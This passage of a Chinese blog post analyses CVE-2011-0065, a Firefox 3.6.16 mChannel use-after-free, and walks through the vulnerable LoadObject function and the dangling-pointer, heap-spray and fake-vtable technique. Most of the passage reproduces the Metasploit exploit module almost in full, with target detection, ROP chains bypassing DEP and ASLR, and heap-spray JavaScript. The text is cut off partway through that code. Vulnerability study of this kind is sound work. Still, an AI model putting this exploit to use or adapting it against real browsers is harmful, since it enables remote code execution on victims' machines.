触发漏洞的函数</span><br><span class="line">```c</span><br><span class="line">nsresult</span><br><span class="line">nsObjectLoadingContent::LoadObject(nsIURI* aURI,</span><br><span class="line">                                   PRBool aNotify,</span><br><span class="line">                                   <span class="keyword">const</span> nsCString&amp; aTypeHint,</span><br><span class="line">                                   PRBool aForceLoad)</span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line"><span class="comment">// From here on, we will always change the content. This means that a</span></span><br><span class="line">  <span class="comment">// possibly-loading channel should be aborted.</span></span><br><span class="line">  <span class="keyword">if</span> (mChannel) &#123;</span><br><span class="line">    LOG((<span class="string">"OBJLC [%p]: Cancelling existing load\n"</span>, <span class="keyword">this</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mClassifier) &#123;</span><br><span class="line">      mClassifier-&gt;Cancel();</span><br><span class="line">      mClassifier = nsnull;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// These three statements are carefully ordered:</span></span><br><span class="line">    <span class="comment">// - onStopRequest should get a channel whose status is the same as the</span></span><br><span class="line">    <span class="comment">//   status argument</span></span><br><span class="line">    <span class="comment">// - onStopRequest must get a non-null channel</span></span><br><span class="line">    mChannel-&gt;Cancel(NS_BINDING_ABORTED);</span><br><span class="line">    <span class="keyword">if</span> (mFinalListener) &#123;</span><br><span class="line">      <span class="comment">// <span class="doctag">NOTE:</span> Since mFinalListener is only set in onStartRequest, which takes</span></span><br><span class="line">      <span class="comment">// care of calling mFinalListener-&gt;OnStartRequest, mFinalListener is only</span></span><br><span class="line">      <span class="comment">// non-null here if onStartRequest was already called.</span></span><br><span class="line">      mFinalListener-&gt;OnStopRequest(mChannel, nsnull, NS_BINDING_ABORTED);</span><br><span class="line">      mFinalListener = nsnull;</span><br><span class="line">    &#125;</span><br><span class="line">    mChannel = nsnull;</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>简单分析就是这样了，感觉分析的时候有很多坑（虽然这个漏洞有符号文件及源码），一定要坚持下来。总体就是mChannel对象被释放后变成悬挂指针然后马上重新申请这块内存写入构造的shellcode（主要就是修改对象的虚函数表指针地址），在mChannel对象的函数mChannel-&gt;Cancel被使用时获得执行机会。对于漏洞利用还有很多需要细致的学习，通过布局内存利用漏洞。<br>主要知识点包括：虚函数、堆喷射Heap Spray、ROP</p>
<p>##参考<br><a href="https://book.douban.com/subject/26830238/" target="_blank" rel="external">漏洞战争-软件漏洞分析摘要</a><br><a href="http://blog.csdn.net/magictong/article/details/7391397" target="_blank" rel="external">Heap Spray原理浅析</a><br><a href="http://bbs.pediy.com/showthread.php?p=992676" target="_blank" rel="external">Analysis CVE2011-0065-Firefox 3.6.16 mChannel use after free vulnerability</a></p>
<h2 id="更新附录">更新附录</h2><p>shellcode分析可以和msf漏洞生成脚本一起看，一下就豁然开朗了<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br></pre></td><td class="code"><pre><span class="line">##</span><br><span class="line"># This module requires Metasploit: http://metasploit.com/download</span><br><span class="line"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">require 'msf/core'</span><br><span class="line"></span><br><span class="line">class MetasploitModule &lt; Msf::Exploit::Remote</span><br><span class="line">  Rank = NormalRanking</span><br><span class="line"></span><br><span class="line">  include Msf::Exploit::Remote::HttpServer::HTML</span><br><span class="line">  #include Msf::Exploit::Remote::BrowserAutopwn</span><br><span class="line">  #autopwn_info(&#123;</span><br><span class="line">  #  :ua_name =&gt; HttpClients::FF,</span><br><span class="line">  #  :ua_minver =&gt; "3.6.16",</span><br><span class="line">  #  :ua_maxver =&gt; "3.6.16",</span><br><span class="line">  #  :os_name =&gt; OperatingSystems::Match::WINDOWS,</span><br><span class="line">  #  :javascript =&gt; true,</span><br><span class="line">  #  :rank =&gt; NormalRanking,</span><br><span class="line">  #&#125;)</span><br><span class="line"></span><br><span class="line">  def initialize(info = &#123;&#125;)</span><br><span class="line">    super(update_info(info,</span><br><span class="line">      'Name'           =&gt; 'Mozilla Firefox 3.6.16 mChannel Use-After-Free Vulnerability',</span><br><span class="line">      'Description'    =&gt; %q&#123;</span><br><span class="line">          This module exploits an use after free vulnerability in Mozilla</span><br><span class="line">        Firefox 3.6.16. An OBJECT Element mChannel can be freed via the</span><br><span class="line">        OnChannelRedirect method of the nsIChannelEventSink Interface. mChannel</span><br><span class="line">        becomes a dangling pointer and can be reused when setting the OBJECTs</span><br><span class="line">        data attribute. (Discovered by regenrecht). This module uses heapspray</span><br><span class="line">        with a minimal ROP chain to bypass DEP on Windows XP SP3. Additionlay,</span><br><span class="line">        a windows 7 target was provided using JAVA 6 and below to avoid aslr.</span><br><span class="line">      &#125;,</span><br><span class="line">      'License'        =&gt; MSF_LICENSE,</span><br><span class="line">      'Author'         =&gt;</span><br><span class="line">        [</span><br><span class="line">          'regenrecht',  # discovery</span><br><span class="line">          'Rh0',         # metasploit module</span><br><span class="line">          'mr_me &lt;steventhomasseeley[at]gmail.com&gt;' # win7 target</span><br><span class="line">        ],</span><br><span class="line">      'References'     =&gt;</span><br><span class="line">        [</span><br><span class="line">          ['CVE',    '2011-0065'],</span><br><span class="line">          ['OSVDB',  '72085'],</span><br><span class="line">          ['URL',    'https://bugzilla.mozilla.org/show_bug.cgi?id=634986'],</span><br><span class="line">          ['URL',    'http://www.mozilla.org/security/announce/2011/mfsa2011-13.html']</span><br><span class="line">        ],</span><br><span class="line">      'DefaultOptions' =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">          'EXITFUNC' =&gt; 'process',</span><br><span class="line">          'InitialAutoRunScript' =&gt; 'migrate -f',</span><br><span class="line">        &#125;,</span><br><span class="line">      'Payload'        =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">          'Space' =&gt; 1024,</span><br><span class="line">        &#125;,</span><br><span class="line">      'Platform'       =&gt; 'win',</span><br><span class="line">      'Targets'        =&gt;</span><br><span class="line">        [</span><br><span class="line"></span><br><span class="line">          [ 'Automatic', &#123; &#125; ],</span><br><span class="line"></span><br><span class="line">          # DEP bypass</span><br><span class="line">          [</span><br><span class="line">            'Firefox 3.6.16 on Windows XP SP3',</span><br><span class="line">            &#123;</span><br><span class="line">              'Arch' =&gt; ARCH_X86,</span><br><span class="line">              'Fakevtable' =&gt; 0x0c00,   //站位虚函数表地址</span><br><span class="line">              'Fakefunc' =&gt; 0x0c00001c,</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line"></span><br><span class="line">          # requires JAVA &lt;= JAVA 6 update 26</span><br><span class="line">          # cop stack pivot = ASLR/DEP bypass</span><br><span class="line">          [</span><br><span class="line">            'Firefox 3.6.16 on Windows 7 + Java',</span><br><span class="line">            &#123;</span><br><span class="line">              'Arch' =&gt; ARCH_X86,</span><br><span class="line">              'Fakevtable' =&gt; 0x1000,</span><br><span class="line">              'Fakefunc' =&gt; 0x100002a4,</span><br><span class="line">              'Ppppr' =&gt; 0x7c3410c0,</span><br><span class="line">              'Retn' =&gt; 0x7c3410c4,</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        ],</span><br><span class="line">      'DefaultTarget'  =&gt; 0,</span><br><span class="line">      'DisclosureDate' =&gt; 'May 10 2011'</span><br><span class="line">      ))</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def junk</span><br><span class="line">    return rand_text_alpha(4).unpack("L")[0].to_i</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def on_request_uri(cli, request)</span><br><span class="line"></span><br><span class="line">    # Random JavaScript variable names</span><br><span class="line">    js_element_name      = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_obj_addr_name     = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_sc_name           = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_ret_addr_name     = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_chunk_name        = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_final_chunk_name  = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_block_name        = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_array_name        = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_retns             = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_applet_name       = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_ppppr             = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_filler            = rand_text_alpha(rand(10) + 5)</span><br><span class="line"></span><br><span class="line">    agent = request.headers['User-Agent']</span><br><span class="line"></span><br><span class="line">    # Set target manually or automatically</span><br><span class="line">    my_target = target</span><br><span class="line">    if my_target.name == 'Automatic'</span><br><span class="line">      if agent =~ /NT 5\.1/ and agent =~ /Firefox\/3\.6\.16/</span><br><span class="line">        my_target = targets[1]</span><br><span class="line">      elsif agent =~ /NT 6\.1/ and agent =~ /Firefox\/3\.6\.16/</span><br><span class="line">        my_target = targets[2]</span><br><span class="line">      end</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    # check for non vulnerable targets</span><br><span class="line">    if agent !~ /NT 5\.1/ or agent !~ /NT 6\.1/ and agent !~ /Firefox\/3\.6\.16/</span><br><span class="line">      print_error("Target not supported: #&#123;agent&#125;")</span><br><span class="line">      send_not_found(cli)</span><br><span class="line">      return</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    # Re-generate the payload</span><br><span class="line">    return if ((p = regenerate_payload(cli).encoded) == nil)</span><br><span class="line"></span><br><span class="line">    if my_target.name =~ /Windows 7/ and not request.uri =~ /\.html/</span><br><span class="line"></span><br><span class="line">      html_trigger = ""</span><br><span class="line">      if ("/" == get_resource[-1,1])</span><br><span class="line">        html_trigger = get_resource[0, get_resource.length - 1]</span><br><span class="line">      else</span><br><span class="line">        html_trigger = get_resource</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">      custom_js = &lt;&lt;-JS</span><br><span class="line">      function forward() &#123;</span><br><span class="line">        window.location = window.location + "#&#123;html_trigger&#125;.html";</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      function start() &#123;</span><br><span class="line">        setTimeout("forward()", 3500);</span><br><span class="line">      &#125;</span><br><span class="line">      start();</span><br><span class="line">      JS</span><br><span class="line"></span><br><span class="line">    else</span><br><span class="line">      if my_target.name =~ /Windows XP/</span><br><span class="line"></span><br><span class="line">        # DEP bypass using xul.dll</span><br><span class="line">        rop_gadgets = [</span><br><span class="line">          0x1052c871,  # mov esp,[ecx] / mov edx,5c86c6ff / add [eax],eax / xor eax,eax / pop esi / retn 0x8 [xul.dll]</span><br><span class="line">          junk,        # junk --------------------------------------------------------------^^</span><br><span class="line">          0x7c801ad4,  # VirtualProtect</span><br><span class="line">          junk,        # junk -------------------------------------------------------------------------^^</span><br><span class="line">          junk,        # junk -------------------------------------------------------------------------^^</span><br><span class="line">          0x1003876B,  # jmp esp</span><br><span class="line">          0x0c000040,  # start address</span><br><span class="line">          0x00000400,  # size 1024</span><br><span class="line">          0x00000040,  # Page EXECUTE_READ_WRITE</span><br><span class="line">          0x0c0c0c00,  # old protection</span><br><span class="line">        ].pack("V*")</span><br><span class="line"></span><br><span class="line">        rop = rop_gadgets</span><br><span class="line"></span><br><span class="line">      elsif my_target.name =~ /Windows 7/ and request.uri =~ /\.html/</span><br><span class="line"></span><br><span class="line">        # 5 gadgets to pivot using call oriented programming (cop)</span><br><span class="line">        # these instructions are taken from: java.dll, zip.dll and MSVCR71.dll (non aslr)</span><br><span class="line">        # 1. MOV EDX,DWORD PTR DS:[ECX] / junk / junk / junk / PUSH ECX / CALL [EDX+28C]</span><br><span class="line">        # 2. PUSH EAX / PUSH EBX / PUSH ESI / CALL [ECX+1C0]</span><br><span class="line">        # 3. PUSH EBP / MOV EBP,ESP / MOV EAX,[EBP+18] / PUSH 1C / PUSH 1 / PUSH [EAX+28] / CALL [EAX+20]</span><br><span class="line">        # 4. CALL [EAX+24] / POP ECX / POP ECX / RETN (neatly place address onto the stack)</span><br><span class="line">        # 5. ADD EAX,4 / TEST [EAX],EAX / XCHG EAX,ESP / MOV EAX,[EAX] / PUSH EAX / RETN</span><br><span class="line"></span><br><span class="line">        rop_pivot = [</span><br><span class="line">          0x6D32280C,  # 1. MOV EDX,DWORD PTR DS:[ECX] / junk / junk / junk / PUSH ECX / CALL [EDX+28C]</span><br><span class="line">          junk,        # filler</span><br><span class="line">          0x6D7E627D,  # 4. CALL [EAX+24] / POP ECX / POP ECX / RETN (neatly place address onto the stack)</span><br><span class="line">          0x7C3413A4,  # 5. ADD EAX,4 / TEST [EAX],EAX / XCHG EAX,ESP / MOV EAX,[EAX] / PUSH EAX / RETN</span><br><span class="line">        ].pack("V*")</span><br><span class="line"></span><br><span class="line">        # 319</span><br><span class="line"></span><br><span class="line">        # rop nops - RETN</span><br><span class="line">        rop_pivot &lt;&lt; [0x7c3410c4].pack("V*") * 0x65 #(0xca-0x65)</span><br><span class="line"></span><br><span class="line">        # POP r32 / RETN</span><br><span class="line">        rop_pivot &lt;&lt; [0x7c3410c3].pack("V*")</span><br><span class="line"></span><br><span class="line">        # 3. PUSH EBP / MOV EBP,ESP / MOV EAX,[EBP+18] / PUSH 1C / PUSH 1 / PUSH [EAX+28] / CALL [EAX+20]</span><br><span class="line">        rop_pivot &lt;&lt; [0x6D7E5CDA].pack("V*")</span><br><span class="line"></span><br><span class="line">        # rop nops - RETN</span><br><span class="line">        rop_pivot &lt;&lt; [0x7c3410c4].pack("V*") * 0xda # (0x75+0x65)</span><br><span class="line"></span><br><span class="line">        # POP r32 / RETN</span><br><span class="line">        rop_pivot &lt;&lt; [0x7c3410c3].pack("V*")</span><br><span class="line"></span><br><span class="line">        # 2. PUSH EAX / PUSH EBX / PUSH ESI / CALL [ECX+1C0]</span><br><span class="line">        rop_pivot &lt;&lt; [0x6D325BFC].pack("V*")</span><br><span class="line"></span><br><span class="line">        # https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/ &lt;MSVCR71.dll&gt;</span><br><span class="line">        rop_gadgets = [</span><br><span class="line">          0x7c346c0a,  # POP EAX / RETN</span><br><span class="line">          0x7c37a140,  # Make EAX readable</span><br><span class="line">          0x7c37591f,  # PUSH ESP / ... / POP ECX / POP EBP / RETN</span><br><span class="line">          junk,        # EBP (filler)</span><br><span class="line">          0x7c346c0a,  # POP EAX / RETN</span><br><span class="line">          0x7c37a140,  # *&amp;VirtualProtect()</span><br><span class="line">          0x7c3530ea,  # MOV EAX,[EAX] / RETN</span><br><span class="line">          0x7c346c0b,  # Slide, so next gadget would write to correct stack location</span><br><span class="line">          0x7c376069,  # MOV [ECX+1C],EAX / POP EDI / POP ESI / POP EBX / RETN</span><br><span class="line">          junk,        # EDI (filler)</span><br><span class="line">          junk,        # will be patched at runtime (VP), then picked up into ESI</span><br><span class="line">          junk,        # EBX (filler)</span><br><span class="line">          0x7c376402,  # POP EBP / RETN</span><br><span class="line">          0x7c345c30,  # ptr to 'push esp /  ret'</span><br><span class="line">          0x7c346c0a,  # POP EAX / RETN</span><br><span class="line">          0xfffffdff,  # size 0x00000201 -&gt; ebx</span><br><span class="line">          0x7c351e05,  # NEG EAX / RETN</span><br><span class="line">          0x7c354901,  # POP EBX / RETN</span><br><span class="line">          0xffffffff,  # pop value into ebx</span><br><span class="line">          0x7c345255,  # INC EBX / FPATAN / RETN</span><br><span class="line">          0x7c352174,  # ADD EBX,EAX / XOR EAX,EAX / INC EAX / RETN</span><br><span class="line">          0x7c34d201,  # POP ECX / RETN</span><br><span class="line">          0x7c38b001,  # RW pointer (lpOldProtect) (-&gt; ecx)</span><br><span class="line">          0x7c34b8d7,  # POP EDI / RETN</span><br><span class="line">          0x7c34b8d8,  # ROP NOP (-&gt; edi)</span><br><span class="line">          0x7c344f87,  # POP EDX / RETN</span><br><span class="line">          0xffffffc0,  # value to negate, target value : 0x00000040, target: edx</span><br><span class="line">          0x7c351eb1,  # NEG EDX / RETN</span><br><span class="line">          0x7c346c0a,  # POP EAX / RETN</span><br><span class="line">          0x90909090,  # NOPS (-&gt; eax)</span><br><span class="line">          0x7c378c81,  # PUSHAD / ADD AL,0EF / RETN</span><br><span class="line">          0x90909090,  # NOPS (-&gt; eax)</span><br><span class="line">        ].pack("V*")</span><br><span class="line"></span><br><span class="line">        rop = rop_pivot + rop_gadgets</span><br><span class="line"></span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">      payload_buf  = ''</span><br><span class="line">      payload_buf &lt;&lt; rop</span><br><span class="line">      payload_buf &lt;&lt; p</span><br><span class="line">      escaped_payload = Rex::Text.to_unescape(payload_buf)</span><br><span class="line"></span><br><span class="line">      # setup the fake memory references</span><br><span class="line">      fakevtable = Rex::Text.to_unescape([my_target['Fakevtable']].pack('v'))</span><br><span class="line">      fakefunc = Rex::Text.to_unescape([my_target['Fakefunc']].pack('V*'))</span><br><span class="line"></span><br><span class="line">      if my_target.name =~ /Windows XP/</span><br><span class="line"></span><br><span class="line">        # fast loading JS so we dont get the 'unresponsive script' warning from ff</span><br><span class="line">        custom_js = &lt;&lt;-JS</span><br><span class="line">        #&#123;js_element_name&#125; = document.getElementById("d");</span><br><span class="line">        #&#123;js_element_name&#125;.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0)</span><br><span class="line"></span><br><span class="line">        #&#123;js_obj_addr_name&#125; = unescape("\x00#&#123;fakevtable&#125;");</span><br><span class="line">        var #&#123;js_sc_name&#125; = unescape("#&#123;escaped_payload&#125;");</span><br><span class="line"></span><br><span class="line">        var #&#123;js_ret_addr_name&#125; = unescape("#&#123;fakefunc&#125;");</span><br><span class="line">        while(#&#123;js_ret_addr_name&#125;.length &lt; 0x80) &#123;#&#123;js_ret_addr_name&#125; += #&#123;js_ret_addr_name&#125;;&#125;</span><br><span class="line">        var #&#123;js_chunk_name&#125; = #&#123;js_ret_addr_name&#125;.substring(0,0x18/2);</span><br><span class="line">        #&#123;js_chunk_name&#125; += #&#123;js_sc_name&#125;;</span><br><span class="line">        #&#123;js_chunk_name&#125; += #&#123;js_ret_addr_name&#125;;</span><br><span class="line">        var #&#123;js_final_chunk_name&#125; = #&#123;js_chunk_name&#125;.substring(0,0x10000/2);</span><br><span class="line">        while (#&#123;js_final_chunk_name&#125;.length&lt;0x800000) &#123;#&#123;js_final_chunk_name&#125; += #&#123;js_final_chunk_name&#125;;&#125;</span><br><span class="line">        var #&#123;js_block_name&#125; = #&#123;js_final_chunk_name&#125;.substring(0,0x80000 - #&#123;js_sc_name&#125;.length - 0x24/2 - 0x4/2 - 0x2/2);</span><br><span class="line">        #&#123;js_array_name&#125; = new Array()</span><br><span class="line">        for (n=0;n&lt;0x80;n++)&#123;</span><br><span class="line">          #&#123;js_array_name&#125;[n] = #&#123;js_block_name&#125; + #&#123;js_sc_name&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        JS</span><br><span class="line">      elsif my_target.name =~ /Windows 7/</span><br><span class="line"></span><br><span class="line">        # setup precision heap spray</span><br><span class="line">        ppppr = Rex::Text.to_unescape([my_target['Ppppr']].pack('V*'))</span><br><span class="line">        retns = Rex::Text.to_unescape([my_target['Retn']].pack('V*'))</span><br><span class="line"></span><br><span class="line">        # fast loading JS so we dont get the 'unresponsive script' warning from ff</span><br><span class="line">        # precision heap spray</span><br><span class="line">        custom_js = &lt;&lt;-JS</span><br><span class="line">        #&#123;js_element_name&#125; = document.getElementById("d");</span><br><span class="line">        #&#123;js_element_name&#125;.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0)</span><br><span class="line"></span><br><span class="line">        #&#123;js_obj_addr_name&#125; = unescape("\x00#&#123;fakevtable&#125;");</span><br><span class="line">        var #&#123;js_sc_name&#125; = unescape("#&#123;escaped_payload&#125;");</span><br><span class="line"></span><br><span class="line">        var #&#123;js_ret_addr_name&#125; = unescape("#&#123;fakefunc&#125;");</span><br><span class="line">        var #&#123;js_retns&#125; = unescape("#&#123;retns&#125;");</span><br><span class="line"></span><br><span class="line">        #&#123;js_ret_addr_name&#125; += #&#123;js_retns&#125;;</span><br><span class="line">        #&#123;js_ret_addr_name&#125; += #&#123;js_retns&#125;;</span><br><span class="line">        #&#123;js_ret_addr_name&#125; += #&#123;js_retns&#125;;</span><br><span class="line">        #&#123;js_ret_addr_name&#125; += #&#123;js_retns&#125;;</span><br><span class="line"></span><br><span class="line">        var #&#123;js_ppppr&#125; = unescape("#&#123;ppppr&#125;");</span><br><span class="line">        #&#123;js_ret_addr_name&#125; += #&#123;js_ppppr&#125;;</span><br><span class="line"></span><br><span class="line">        var #&#123;js_filler&#125; = unescape("%u4344%u4142");</span><br><span class="line">        while(#&#123;js_filler&#125;.length &lt; 0x201) &#123;#&#123;js_filler&#125; += #&#123;js_filler&#125;;&#125;</span><br><span class="line"></span><br><span class="line">        while(#&#123;js_ret_addr_name&#125;.length &lt; 0x80) &#123;#&#123;js_ret_addr_name&#125; += #&#123;js_ret_addr_name&#125;;&#125;</span><br><span class="line"></span><br><span class="line">        var #&#123;js_chunk_name&#125; = #&#123;js_ret_addr_name&#125;.substring(0,0x18/2);</span><br><span class="line"></span><br><span class="line">        #&#123;js_chunk_name&#125; += #&#123;js_sc_name&#125;;</span><br><span class="line">        #&#123;js_chunk_name&#125; += #&#123;js_filler&#125;;</span><br><span class="line">        #&#123;js_chunk_name&#125; += #&#123;js_ret_addr_name&#125;;</span><br><span class="line"></span><br><span class="line">        var #&#123;js_final_chunk_name&#125; = #&#123;js_chunk_name&#125;.substring(0,0x10000/2);</span><br><span class="line">        while (#&#123;js_final_chunk_name&#125;.length&lt;0x800000) &#123;#&#123;js_final_chunk_name&#125; += #&#123;js_final_chunk_name&#125;;&#125;</span><br><span class="line">        var #&#123;js_block_name&#125; = #&#123;js_final_chunk_name&#125;.substring(0,0x80000 - #&#123;js_sc_name&#125;.length - 0x24/2 - 0x4/2 - 0x2/2);</span><br><span class="line">        